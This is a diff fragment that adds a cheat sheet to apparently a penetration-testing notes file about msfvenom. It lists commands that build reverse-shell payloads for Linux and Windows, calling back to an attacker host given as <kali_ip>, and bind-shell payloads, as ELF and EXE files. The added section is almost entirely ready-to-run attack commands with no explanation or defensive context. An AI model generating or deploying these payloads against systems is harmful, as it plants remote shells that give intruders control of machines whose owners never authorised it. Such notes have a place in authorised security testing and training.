@@ -47,3 +47,30 @@ c           C-style shellcode
 python      Python shellcode
 powershell  PowerShell
 ```
+
+## Cheatsheet
+
+### Linux
+Reverse
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f elf -o shell.elf
+```
+
+Bind
+```
+msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
+```
+
+### Windows
+Reverse
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o shell.exe
+```
+
+Bind
+```
+msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind.exe
+```
+
